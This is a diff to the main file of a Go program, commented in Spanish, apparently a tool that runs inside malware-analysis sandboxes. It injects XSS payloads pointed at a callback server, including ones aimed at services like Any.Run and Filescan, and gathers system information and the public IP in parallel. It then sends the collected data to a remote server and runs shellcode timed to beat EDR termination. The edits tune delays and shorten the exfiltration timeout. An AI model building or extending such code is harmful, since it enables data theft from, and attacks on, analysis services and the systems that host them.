@@ -37,8 +37,8 @@ var Test3 = `X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H
 var globalSink interface{}
 
 func main() {
-	// Eliminamos el sleep inicial para acelerar la ejecución
-	time.Sleep(2 * time.Second)
+	// Reducido el sleep inicial para acelerar
+	time.Sleep(1 * time.Second)
 
 	// Cargar configuración
 	cfg := config.Load(targetSandbox)
@@ -86,26 +86,22 @@ func main() {
 
 	// === MODO XSS AUDIT ===
 	if cfg.XSSAudit {
-		// Inyectar payloads y obtener metadata
+		// Inyectar payloads básicos y obtener metadata
 		payload.XSSPayloads = injectXSSAudit(cfg.CallbackServer, payload)
 
-		// Inyectar Payloads XSS adicionales (antes eran prompts de IA, ahora son XSS)
-		xssPayloads := xss.GetAIPrompts(cfg.CallbackServer)
-		xss.InjectAIPrompts(xssPayloads, cfg.CallbackServer, cfg.TargetSandbox)
+		// Comentado para acelerar exfiltración - Solo payloads básicos
+		// xssPayloads := xss.GetAIPrompts(cfg.CallbackServer)
+		// xss.InjectAIPrompts(xssPayloads, cfg.CallbackServer, cfg.TargetSandbox)
 
-		// Ejecutar vectores avanzados adicionales
-		xss.ExecuteAllAdvancedVectors()
-
-		// Ejecutar vectores específicos para sandboxes (Any.Run, Filescan, etc.)
-		xss.ExecuteSandboxSpecificVectors()
-
-		// Inyectar payload XSS en TODOS lados (archivos, registro, procesos, etc.)
-		xss.InjectXSSEverywhere()
+		// Ejecutar solo vectores críticos
+		// xss.ExecuteAllAdvancedVectors() // COMENTADO - Tarda mucho
+		// xss.ExecuteSandboxSpecificVectors() // COMENTADO - Tarda mucho
+		// xss.InjectXSSEverywhere() // COMENTADO - Tarda mucho
 	}
 
 	// WaitGroup para ejecutar colectores en paralelo
 	var wg sync.WaitGroup
-	wg.Add(5) // 4 colectores + PublicIP
+	wg.Add(5) // 5 colectores + PublicIP
 
 	// 1. SystemInfo (recopilación pura de datos)
 	go func() {
@@ -143,8 +139,8 @@ func main() {
 
 	// Intentar enviar payload al servidor con timeout reducido para sandboxes
 	exfilTimeout := cfg.Timeout
-	if exfilTimeout > 30*time.Second {
-		exfilTimeout = 30 * time.Second // Máximo 30s para exfiltración
+	if exfilTimeout > 20*time.Second {
+		exfilTimeout = 20 * time.Second // Máximo 20s para exfiltración (antes 30s)
 	}
 
 	// Preparar datos finales (inyectando binary_hash sin modificar struct Payload)
@@ -176,8 +172,8 @@ func main() {
 	// antes de que el proceso pueda crashear o ser terminado por el EDR.
 	shellcode.Execute()
 
-	// Dar tiempo al shellcode para ejecutarse y ser detectado antes de salir
-	time.Sleep(5 * time.Second)
+	// Reducido el sleep final
+	time.Sleep(2 * time.Second)
 }
 
 func checkConnectivity(url string) {
